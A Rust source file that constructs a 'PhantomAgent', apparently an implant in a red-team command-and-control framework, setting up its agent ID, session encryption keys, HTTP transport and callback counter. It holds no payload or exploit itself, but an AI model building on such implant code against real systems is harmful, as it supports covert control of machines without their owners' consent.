//! `PhantomAgent` construction and session-crypto bootstrap.

use red_cell_common::crypto::{
    derive_session_keys, derive_session_keys_for_version, generate_agent_crypto_material,
};

use crate::command::PhantomState;
use crate::config::PhantomConfig;
use crate::error::PhantomError;
use crate::transport::HttpTransport;

use super::PhantomAgent;

impl PhantomAgent {
    /// Create a new agent with fresh per-session crypto material.
    pub fn new(config: PhantomConfig) -> Result<Self, PhantomError> {
        config.validate()?;

        let agent_id = rand::random::<u32>() | 1;
        let raw_crypto = generate_agent_crypto_material()?;
        let session_crypto = match config.init_secret.as_deref() {
            None => raw_crypto.clone(),
            Some(secret) => {
                if let Some(version) = config.init_secret_version {
                    derive_session_keys_for_version(
                        &raw_crypto.key,
                        &raw_crypto.iv,
                        version,
                        &[(version, secret.as_bytes())],
                    )?
                } else {
                    derive_session_keys(&raw_crypto.key, &raw_crypto.iv, secret.as_bytes())?
                }
            }
        };
        let transport = HttpTransport::new(&config)?;

        Ok(Self {
            agent_id,
            raw_crypto,
            session_crypto,
            config,
            transport,
            ctr_offset: 0,
            callback_seq: 1,
            state: PhantomState::default(),
            ecdh_session: None,
        })
    }
}
